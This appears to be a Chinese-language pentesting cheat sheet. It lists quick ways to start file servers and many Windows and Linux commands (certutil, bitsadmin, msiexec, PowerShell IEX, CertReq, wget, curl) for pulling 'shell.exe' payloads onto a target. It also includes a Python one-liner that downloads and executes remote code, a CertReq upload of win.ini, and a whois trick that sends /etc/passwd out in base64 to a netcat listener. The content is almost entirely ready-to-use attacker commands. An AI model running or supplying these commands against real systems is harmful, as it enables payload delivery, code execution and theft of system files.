快速搭建http服务

python(及其常用)

python3 -m http.server 6666 #python3python -m SimpleHTTPServer 6666 #python2python3 -m pyftpdlib -p 6666#ftp这个，需要pip install pyftpdlib,pip3或者pip都可以impacket-smbserver files . -port 6666   #不常用

PHP 5.4+(应急用)

 php -S 0.0.0.0:6666


Ruby(应急用)

ruby -rwebrick -e'WEBrick::HTTPServer.new(:Port => 6666, :DocumentRoot => Dir.pwd).start'ruby -run -e httpd . -p 6666 #Ruby 1.9.2+

busybox httpd(应急用)

 busybox httpd -f -p 6666


文件下载(命令)

ipc$

 copy \127.0.0.1\c$\1.exe C:\shell.exe


Certutil(极其常用)

 certutil.exe -urlcache -split -f http://127.0.0.1:6666/1.exe shell.exe


CMD - SMB

copy \\127.0.0.1\files\1.exe shell.exe

Powershell(常用)

powershell.exe -Command "Invoke-WebRequest -Uri http://127.0.0.1:6666/shell.exe -OutFile shell2.exe"powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('http://127.0.0.1:6666/shell.exe', shell2.exe)"

bitsadmin(较为常用)

windows7、windows 2008R2、windows10都有

 bitsadmin /rawreturn /transfer down "http://127.0.0.1:6666/1.exe" c:\\shell.exe

msiexec

 msiexec /q /i http://127.0.0.1:6666/1.exe msiexec /q /%os:~1,1%http://127.0.0.1:6666/1.exe

CertReq.exe 下载

 CertReq -Post -config http://127.0.0.1:6666/ c:\windows\win.ini output.txt

CertReq.exe 上传

CertReq -Post -config http://127.0.0.1:6666/ c:\windows\win.ini and show response in terminal


python

python -c "import urllib2; exec urllib2.urlopen('http://127.0.0.1:6666/1.exe').read();"

Linux whois

这个挺有意思的，算是一种加密传输吧

whois -h 127.0.0.1 -p 6666 `cat /etc/passwd | base64`nc -lvvp 6666 | sed "s/ //g" | base64 -d

wget

wget http://127.0.0.1:8080/1.exe -O shell.exe

curl

直接输入curl http://ip/xx.exe是无法将目标下载到目标机器上的，必须加参数-O或者--output

curl http://127.0.0.1:6666/1.exe -O shell.exe 或者 curl http://127.0.0.1:6666/1.exe --output shell.exe
